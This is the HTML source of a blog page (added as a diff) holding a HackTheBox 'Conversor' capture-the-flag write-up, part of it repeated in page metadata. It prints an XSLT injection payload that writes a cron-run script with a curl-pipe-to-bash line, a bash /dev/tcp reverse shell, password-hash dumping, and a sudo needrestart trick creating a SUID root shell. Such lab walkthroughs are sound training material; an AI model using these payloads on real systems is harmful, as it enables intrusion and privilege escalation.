@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HTB-Conversor | the008Ki11er</title>
+<meta name="keywords" content="">
+<meta name="description" content="Conversor is an easy Linux machine featuring a web application that converts XML documents into visually formatted HTML documents using XSLT stylesheets. The application processes user-supplied XSLT files without proper sanitisation, leading to an XSLT injection vulnerability. . For privilege escalation, the machine highlights execution of needrestart a vulnerable executable with sudo privileges.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/writeups/hackthebox/conversor/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.f0aeecef0c6bef020a9d5f83f42698478ee2a6e72d20fa4a1c2514cd7de8a85c.css" integrity="sha256-8K7s7wxr7wIKnV&#43;D9CaYR47ipuctIPpKHCUUzX3oqFw=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/hackthebox/conversor/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/writeups/hackthebox/conversor/">
+  <meta property="og:site_name" content="the008Ki11er">
+  <meta property="og:title" content="HTB-Conversor">
+  <meta property="og:description" content="Conversor is an easy Linux machine featuring a web application that converts XML documents into visually formatted HTML documents using XSLT stylesheets. The application processes user-supplied XSLT files without proper sanitisation, leading to an XSLT injection vulnerability. . For privilege escalation, the machine highlights execution of needrestart a vulnerable executable with sudo privileges.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-03-21T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-03-21T00:00:00+00:00">
+    <meta property="og:image" content="http://localhost:1313/writeups/hackthebox/conversor/writeups/HacktheBox/conversor-cover.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://localhost:1313/writeups/hackthebox/conversor/writeups/HacktheBox/conversor-cover.png">
+<meta name="twitter:title" content="HTB-Conversor">
+<meta name="twitter:description" content="Conversor is an easy Linux machine featuring a web application that converts XML documents into visually formatted HTML documents using XSLT stylesheets. The application processes user-supplied XSLT files without proper sanitisation, leading to an XSLT injection vulnerability. . For privilege escalation, the machine highlights execution of needrestart a vulnerable executable with sudo privileges.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "http://localhost:1313/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HackTheBox",
+      "item": "http://localhost:1313/writeups/hackthebox/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "HTB-Conversor",
+      "item": "http://localhost:1313/writeups/hackthebox/conversor/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB-Conversor",
+  "name": "HTB-Conversor",
+  "description": "Conversor is an easy Linux machine featuring a web application that converts XML documents into visually formatted HTML documents using XSLT stylesheets. The application processes user-supplied XSLT files without proper sanitisation, leading to an XSLT injection vulnerability. . For privilege escalation, the machine highlights execution of needrestart a vulnerable executable with sudo privileges.",
+  "keywords": [
+    
+  ],
+  "articleBody": "Overview Category Info Machine Name Conversor Difficulty Easy Release Date 25 oct 2025 Author fismathack OS Linux Pwned Date 12 Nov 2025 Reconnaissance Nmap Scan nmap -sC -sV -oN nmap_initial.txt Findings:\nPort 22 — ssh Port 80 — http Web Analysis We are given a login page which gives “Invalid credentials” response for invalid credentials. After registering a user we get into a page which converts XML files to asthetic formats using XSLT stylesheet. Upon further looking we are able to find source_code.gz file in about section. . ├── instance │ └── users.db ├── scripts ├── static │ └── images │ ├── nmap.xslt │ └── style.css ├── templates │ ├── about.html │ ├── base.html │ ├── index.html │ ├── login.html │ ├── register.html │ └── result.html ├── uploads ├── app.py ├── app.wsgi └── install.md INSTALL.md -\u003e Cron Job Configuration The installation documentation reveals a critical cron job configuration:\nIf you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab. \"\"\" * * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 \"$f\"; done \"\"\" This indicates that any .py file in /var/www/conversor.htb/scripts/ owned by www-data will be executed every minute as the www-data user.\napp.py -\u003e Vulnerable XSLT Processing The main application uses the lxml library for XML/XSLT processing:\nDB_PATH = '/var/www/conversor.htb/instance/users.db' def convert(): from lxml import etree xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename) xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename) xml_file.save(xml_path) xslt_file.save(xslt_path) Vulnerability: The application processes XSLT files without proper security restrictions, allowing EXSLT extension functions that can read and write files.\nExploitation XSLT Injection \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cxsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:exploit=\"http://exslt.org/common\" extension-element-prefixes=\"exploit\" version=\"1.0\" \u003e \u003cxsl:template match=\"/\"\u003e \u003cexploit:document href=\"/var/www/conversor.htb/scripts/revshell.py\" method=\"text\"\u003e import os os.system(\"curl http://:1337/revshell.sh|bash\") \u003c/exploit:document\u003e \u003c/xsl:template\u003e \u003c/xsl:stylesheet\u003e save as exploit.xslt\nAttack Execution 1. Generate legitimate XML file: nmap -A -oX nmap.xml 10.10.11.92 2. Set up HTTP server to serve the reverse shell: python3 -m http.server 1337 3. Prepare reverse shell payload (revshell.sh) and save inside same directory as XML and XSLT files: #!/bin/bash bash -i \u003e\u0026 /dev/tcp//4444 0\u003e\u00261 4. Start netcat listener: rlwrap nc -lnvp 4444 5. Upload the files directly in the conversor site and click on convert Initial Access User Enumeration Checking system users reveals the fismathack user:\nCredential Discovery Enumerating the filesystem reveals the application database file at /var/www/conversor.htb/users.db\nwww-data@conversor:~/conversor.htb/instance$ sqlite3 users.db .tables; files users select * from users; 1|fismathack|5b5c3ac3************************** Hash Cracking used hashcat:\nFound passwords for fismathack. Code Review and Exploitation User Access We use the discovered credentials to access the system via SSH:\nfismathack@conversor:~$ id uid=1000(fismathack) gid=1000(fismathack) groups=1000(fismathack) Privilege Escalation Sudo Privileges Analysis Checking sudo permissions reveals critical access:\nfismathack@conversor:~$ sudo -l User fismathack may run the following commands on conversor: (ALL : ALL) NOPASSWD: /usr/sbin/needrestart Understanding Needrestart Needrestart is a Debian/Ubuntu utility that detects processes using outdated libraries after system upgrades. Key features:\nScans running processes via /proc Maps loaded libraries against upgraded packages Can automatically restart affected services Configurable via /etc/needrestart/needrestart.conf Looking at the help page of the needrestart binary, we can see that it can read config files. Since we are running the command with sudo privileges, we can point the -c option at /root/root.txt.\nsudo /usr/sbin/needrestart -c /root/root.txt Output fismathack@conversor:~$ sudo /usr/sbin/needrestart -c /root/root.txt Bareword found where operator expected at (eval 14) line 1, near \"4a1*******************\" (Missing operator before ?) Error parsing /root/root.txt: syntax error at (eval 14) line 2, near \"4a1******************* Alternative (Gain Root Shell) We can create a file with a malicious Perl code that copies /bin/bash to /tmp/shell and sets the SUID bit.\necho 'system(\"cp /bin/bash /tmp/shell; chmod u+s /tmp/shell\")' \u003e /tmp/shell.conf We execute needrestart.\nsudo /usr/sbin/needrestart -c /tmp/shell.conf After execution, the /tmp/shell binary is created with the SUID bit set. We can then run it to obtain a root shell.\nfismathack@conversor:/tmp$ ls -l /tmp/shell -rwsr-xr-x 1 root root 1396520 Nov 12 17:02 /tmp/shell fismathack@conversor:/tmp$ /tmp/shell -p $# id uid=1000(fismathack) gid=1000(fismathack) euid=0(root) groups=1000(fismathack) Tools Used Tool Purpose nmap Port scanning ffuf Directory fuzzing hashcat Hash cracking nc Reverse shell listener Write-up prepared by: the008killer\n",
+  "wordCount" : "673",
+  "inLanguage": "en",
+  "image":"http://localhost:1313/writeups/hackthebox/conversor/writeups/HacktheBox/conversor-cover.png","datePublished": "2026-03-21T00:00:00Z",
+  "dateModified": "2026-03-21T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/writeups/hackthebox/conversor/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "the008Ki11er",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header sticky-header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="the008Ki11er (Alt + H)">the008Ki11er</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                </ul>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/writeups" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/experience" title="Experience">
+                    <span>Experience</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/">Writeups</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/hackthebox/">HackTheBox</a></div>
+    <h1 class="post-title entry-hint-parent">
+      HTB-Conversor
+    </h1>
+    <div class="post-description">
+      Conversor is an easy Linux machine featuring a web application that converts XML documents into visually formatted HTML documents using XSLT stylesheets. The application processes user-supplied XSLT files without proper sanitisation, leading to an XSLT injection vulnerability. . For privilege escalation, the machine highlights execution of needrestart a vulnerable executable with sudo privileges.
+    </div>
+  </header> 
+<figure class="entry-cover">
+        <img loading="eager" src="http://localhost:1313/writeups/HacktheBox/conversor-cover.png" alt="HTB Conversor cover image">
+        
+</figure><div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">‎ Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#overview" aria-label="Overview">Overview</a></li>
+                <li>
+                    <a href="#reconnaissance" aria-label="Reconnaissance">Reconnaissance</a><ul>
+                        
+                <li>
+                    <a href="#nmap-scan" aria-label="Nmap Scan">Nmap Scan</a></li></ul>
+                </li>
+                <li>
+                    <a href="#web-analysis" aria-label="Web Analysis">Web Analysis</a><ul>
+                        
+                <li>
+                    <a href="#installmd---cron-job-configuration" aria-label="INSTALL.md -&gt; Cron Job Configuration">INSTALL.md -&gt; Cron Job Configuration</a></li>
+                <li>
+                    <a href="#apppy---vulnerable-xslt-processing" aria-label="app.py -&gt; Vulnerable XSLT Processing">app.py -&gt; Vulnerable XSLT Processing</a></li></ul>
+                </li>
+                <li>
+                    <a href="#exploitation" aria-label="Exploitation">Exploitation</a><ul>
+                        
+                <li>
+                    <a href="#xslt-injection" aria-label="XSLT Injection">XSLT Injection</a></li>
+                <li>
+                    <a href="#attack-execution" aria-label="Attack Execution">Attack Execution</a><ul>
+                        
+                <li>
+                    <a href="#1-generate-legitimate-xml-file" aria-label="1. Generate legitimate XML file:">1. Generate legitimate XML file:</a></li>
+                <li>
+                    <a href="#2-set-up-http-server-to-serve-the-reverse-shell" aria-label="2. Set up HTTP server to serve the reverse shell:">2. Set up HTTP server to serve the reverse shell:</a></li>
+                <li>
+                    <a href="#3-prepare-reverse-shell-payload-revshellsh-and-save-inside-same-directory-as-xml-and-xslt-files" aria-label="3. Prepare reverse shell payload (revshell.sh) and save inside same directory as XML and XSLT files:">3. Prepare reverse shell payload (revshell.sh) and save inside same directory as XML and XSLT files:</a></li>
+                <li>
+                    <a href="#4-start-netcat-listener" aria-label="4. Start netcat listener:">4. Start netcat listener:</a></li>
+                <li>
+                    <a href="#5-upload-the-files-directly-in-the-conversor-site-and-click-on-convert" aria-label="5. Upload the files directly in the conversor site and click on convert">5. Upload the files directly in the conversor site and click on convert</a></li></ul>
+                </li>
+                <li>
+                    <a href="#initial-access" aria-label="Initial Access">Initial Access</a></li>
+                <li>
+                    <a href="#user-enumeration" aria-label="User Enumeration">User Enumeration</a></li>
+                <li>
+                    <a href="#credential-discovery" aria-label="Credential Discovery">Credential Discovery</a></li>
+                <li>
+                    <a href="#hash-cracking" aria-label="Hash Cracking">Hash Cracking</a></li></ul>
+                </li>
+                <li>
+                    <a href="#code-review-and-exploitation" aria-label="Code Review and Exploitation">Code Review and Exploitation</a><ul>
+                        
+                <li>
+                    <a href="#user-access" aria-label="User Access">User Access</a></li></ul>
+                </li>
+                <li>
+                    <a href="#privilege-escalation" aria-label="Privilege Escalation">Privilege Escalation</a><ul>
+                        
+                <li>
+                    <a href="#sudo-privileges-analysis" aria-label="Sudo Privileges Analysis">Sudo Privileges Analysis</a><ul>
+                        
+                <li>
+                    <a href="#understanding-needrestart" aria-label="Understanding Needrestart">Understanding Needrestart</a></li>
+                <li>
+                    <a href="#output" aria-label="Output">Output</a></li></ul>
+                </li>
+                <li>
+                    <a href="#alternative-gain-root-shell" aria-label="Alternative (Gain Root Shell)">Alternative (Gain Root Shell)</a></li></ul>
+                </li>
+                <li>
+                    <a href="#tools-used" aria-label="Tools Used">Tools Used</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Category</th>
+          <th>Info</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Machine Name</td>
+          <td>Conversor</td>
+      </tr>
+      <tr>
+          <td>Difficulty</td>
+          <td>Easy</td>
+      </tr>
+      <tr>
+          <td>Release Date</td>
+          <td>25 oct 2025</td>
+      </tr>
+      <tr>
+          <td>Author</td>
+          <td>fismathack</td>
+      </tr>
+      <tr>
+          <td>OS</td>
+          <td>Linux</td>
+      </tr>
+      <tr>
+          <td>Pwned Date</td>
+          <td>12 Nov 2025</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h2 id="reconnaissance">Reconnaissance<a hidden class="anchor" aria-hidden="true" href="#reconnaissance">#</a></h2>
+<h3 id="nmap-scan">Nmap Scan<a hidden class="anchor" aria-hidden="true" href="#nmap-scan">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sC -sV -oN nmap_initial.txt &lt;target-ip&gt;
+</span></span></code></pre></div><p><strong>Findings:</strong></p>
+<ul>
+<li><strong>Port 22</strong> — ssh</li>
+<li><strong>Port 80</strong> — http</li>
+</ul>
+<hr>
+<h2 id="web-analysis">Web Analysis<a hidden class="anchor" aria-hidden="true" href="#web-analysis">#</a></h2>
+<p>We are given a login page which gives <strong>&ldquo;Invalid credentials&rdquo;</strong> response for invalid credentials.
+After registering a user we get into a page which converts XML files to asthetic formats using XSLT stylesheet.
+<img alt="Home" loading="lazy" src="/writeups/hackthebox/conversor/screenshots/homepage.png"></p>
+<p>Upon further looking we are able to find <strong>source_code.gz</strong> file in about section.
+<img alt="Source Code" loading="lazy" src="/writeups/hackthebox/conversor/screenshots/sourcecode.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">├── instance
+</span></span><span class="line"><span class="cl">│   └── users.db
+</span></span><span class="line"><span class="cl">├── scripts
+</span></span><span class="line"><span class="cl">├── static
+</span></span><span class="line"><span class="cl">│   └── images
+</span></span><span class="line"><span class="cl">│       ├── nmap.xslt
+</span></span><span class="line"><span class="cl">│       └── style.css
+</span></span><span class="line"><span class="cl">├── templates
+</span></span><span class="line"><span class="cl">│   ├── about.html
+</span></span><span class="line"><span class="cl">│   ├── base.html
+</span></span><span class="line"><span class="cl">│   ├── index.html
+</span></span><span class="line"><span class="cl">│   ├── login.html
+</span></span><span class="line"><span class="cl">│   ├── register.html
+</span></span><span class="line"><span class="cl">│   └── result.html
+</span></span><span class="line"><span class="cl">├── uploads
+</span></span><span class="line"><span class="cl">├── app.py
+</span></span><span class="line"><span class="cl">├── app.wsgi
+</span></span><span class="line"><span class="cl">└── install.md
+</span></span></code></pre></div><h3 id="installmd---cron-job-configuration">INSTALL.md -&gt; Cron Job Configuration<a hidden class="anchor" aria-hidden="true" href="#installmd---cron-job-configuration">#</a></h3>
+<p>The installation documentation reveals a critical cron job configuration:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&#34;&#34;&#34;
+</span></span><span class="line"><span class="cl">* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 &#34;$f&#34;; done
+</span></span><span class="line"><span class="cl">&#34;&#34;&#34;
+</span></span></code></pre></div><p>This indicates that any <strong><em>.py</em></strong> file in <strong>/var/www/conversor.htb/scripts/</strong> owned by <strong><em>www-data</em></strong> will be executed every minute as the <strong><em>www-data</em></strong> user.</p>
+<h3 id="apppy---vulnerable-xslt-processing">app.py -&gt; Vulnerable XSLT Processing<a hidden class="anchor" aria-hidden="true" href="#apppy---vulnerable-xslt-processing">#</a></h3>
+<p>The main application uses the lxml library for XML/XSLT processing:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">DB_PATH</span> <span class="o">=</span> <span class="s1">&#39;/var/www/conversor.htb/instance/users.db&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">convert</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">from</span> <span class="nn">lxml</span> <span class="kn">import</span> <span class="n">etree</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xml_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="p">,</span> <span class="n">xml_file</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xslt_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="p">,</span> <span class="n">xslt_file</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">xml_file</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">xml_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xslt_file</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">xslt_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span></code></pre></div><p><strong>Vulnerability</strong>: The application processes XSLT files without proper security restrictions, allowing EXSLT extension functions that can read and write files.</p>
+<hr>
+<h2 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
+<h3 id="xslt-injection">XSLT Injection<a hidden class="anchor" aria-hidden="true" href="#xslt-injection">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span><span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">xsl</span><span class="p">:</span><span class="n">stylesheet</span>
+</span></span><span class="line"><span class="cl">  <span class="n">xmlns</span><span class="p">:</span><span class="n">xsl</span><span class="o">=</span><span class="s2">&#34;http://www.w3.org/1999/XSL/Transform&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">xmlns</span><span class="p">:</span><span class="n">exploit</span><span class="o">=</span><span class="s2">&#34;http://exslt.org/common&#34;</span> 
+</span></span><span class="line"><span class="cl">  <span class="n">extension</span><span class="o">-</span><span class="n">element</span><span class="o">-</span><span class="n">prefixes</span><span class="o">=</span><span class="s2">&#34;exploit&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="n">xsl</span><span class="p">:</span><span class="n">template</span> <span class="k">match</span><span class="o">=</span><span class="s2">&#34;/&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">exploit</span><span class="p">:</span><span class="n">document</span> <span class="n">href</span><span class="o">=</span><span class="s2">&#34;/var/www/conversor.htb/scripts/revshell.py&#34;</span> <span class="n">method</span><span class="o">=</span><span class="s2">&#34;text&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;curl http://&lt;ip&gt;:1337/revshell.sh|bash&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">exploit</span><span class="p">:</span><span class="n">document</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;/</span><span class="n">xsl</span><span class="p">:</span><span class="n">template</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">xsl</span><span class="p">:</span><span class="n">stylesheet</span><span class="o">&gt;</span>
+</span></span></code></pre></div><p>save as exploit.xslt</p>
+<h3 id="attack-execution">Attack Execution<a hidden class="anchor" aria-hidden="true" href="#attack-execution">#</a></h3>
+<h4 id="1-generate-legitimate-xml-file">1. Generate legitimate XML file:<a hidden class="anchor" aria-hidden="true" href="#1-generate-legitimate-xml-file">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -A -oX nmap.xml 10.10.11.92
+</span></span></code></pre></div><h4 id="2-set-up-http-server-to-serve-the-reverse-shell">2. Set up HTTP server to serve the reverse shell:<a hidden class="anchor" aria-hidden="true" href="#2-set-up-http-server-to-serve-the-reverse-shell">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">1337</span>
+</span></span></code></pre></div><h4 id="3-prepare-reverse-shell-payload-revshellsh-and-save-inside-same-directory-as-xml-and-xslt-files">3. Prepare reverse shell payload (<code>revshell.sh</code>) and save inside same directory as XML and XSLT files:<a hidden class="anchor" aria-hidden="true" href="#3-prepare-reverse-shell-payload-revshellsh-and-save-inside-same-directory-as-xml-and-xslt-files">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/&lt;IP&gt;/4444 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></div><h4 id="4-start-netcat-listener">4. Start netcat listener:<a hidden class="anchor" aria-hidden="true" href="#4-start-netcat-listener">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rlwrap nc -lnvp <span class="m">4444</span>
+</span></span></code></pre></div><h4 id="5-upload-the-files-directly-in-the-conversor-site-and-click-on-convert">5. Upload the files directly in the conversor site and click on convert<a hidden class="anchor" aria-hidden="true" href="#5-upload-the-files-directly-in-the-conversor-site-and-click-on-convert">#</a></h4>
+<h3 id="initial-access">Initial Access<a hidden class="anchor" aria-hidden="true" href="#initial-access">#</a></h3>
+<p><img alt="Initial Acces" loading="lazy" src="/writeups/hackthebox/conversor/screenshots/initialaccess.png"></p>
+<h3 id="user-enumeration">User Enumeration<a hidden class="anchor" aria-hidden="true" href="#user-enumeration">#</a></h3>
+<p>Checking system users reveals the <code>fismathack</code> user:</p>
+<p><img alt="alt text" loading="lazy" src="/writeups/hackthebox/conversor/screenshots/fismathackuser.png"></p>
+<h3 id="credential-discovery">Credential Discovery<a hidden class="anchor" aria-hidden="true" href="#credential-discovery">#</a></h3>
+<p>Enumerating the filesystem reveals the application database file at
+<code>/var/www/conversor.htb/users.db</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db
+</span></span><span class="line"><span class="cl">.tables<span class="p">;</span>
+</span></span><span class="line"><span class="cl">    files  users
+</span></span><span class="line"><span class="cl"><span class="k">select</span> * from users<span class="p">;</span>
+</span></span><span class="line"><span class="cl">1<span class="p">|</span>fismathack<span class="p">|</span>5b5c3ac3**************************
+</span></span></code></pre></div><h3 id="hash-cracking">Hash Cracking<a hidden class="anchor" aria-hidden="true" href="#hash-cracking">#</a></h3>
+<p>used <code>hashcat</code>:</p>
+<ul>
+<li>Found passwords for <code>fismathack</code>.</li>
+</ul>
+<hr>
+<h2 id="code-review-and-exploitation">Code Review and Exploitation<a hidden class="anchor" aria-hidden="true" href="#code-review-and-exploitation">#</a></h2>
+<h3 id="user-access">User Access<a hidden class="anchor" aria-hidden="true" href="#user-access">#</a></h3>
+<p>We use the discovered credentials to access the system via SSH:</p>
